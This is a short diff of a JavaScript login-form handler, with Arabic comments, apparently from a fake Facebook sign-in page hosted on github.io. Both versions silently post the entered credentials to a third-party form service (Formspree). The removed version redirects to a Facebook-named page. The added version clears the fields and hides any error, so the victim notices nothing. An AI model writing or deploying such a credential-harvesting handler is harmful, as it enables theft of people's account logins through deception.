@@ -1,23 +1,23 @@
-const form = document.getElementById("login");
+const loginForm = document.getElementById("login");
 
-form.addEventListener("submit", async (event) => {
-  event.preventDefault(); // منع الصفحة من إعادة التحميل
+loginForm.addEventListener("submit", function(event) {
+    event.preventDefault(); // يمنع الصفحة من الانتقال لـ Formspree
 
-  const data = new FormData(event.target);
-  
-  // إرسال البيانات في الخلفية
-  const response = await fetch(event.target.action, {
-    method: 'POST',
-    body: data,
-    headers: {
-        'Accept': 'application/json'
-    }
-  });
-
-  if (response.ok) {
-    // هنا تضع الرابط الذي تريد توجيه المستخدم إليه مجاناً
-    window.location.href = "https://kurayami-kun.github.io/facebook/sign_in.html"; 
-  } else {
-    alert("حدث خطأ أثناء الإرسال، حاول مجدداً.");
-  }
+    const data = new FormData(event.target);
+    
+    // إرسال البيانات في الخلفية
+    fetch(event.target.action, {
+        method: 'POST',
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+    }).then(response => {
+        if (response.ok) {
+            // مسح جميع الخانات فور نجاح الإرسال
+            loginForm.reset(); 
+        }
+    }).catch(error => {
+        // لن يظهر أي شيء للمستخدم حتى لو حدث خطأ
+    });
 });
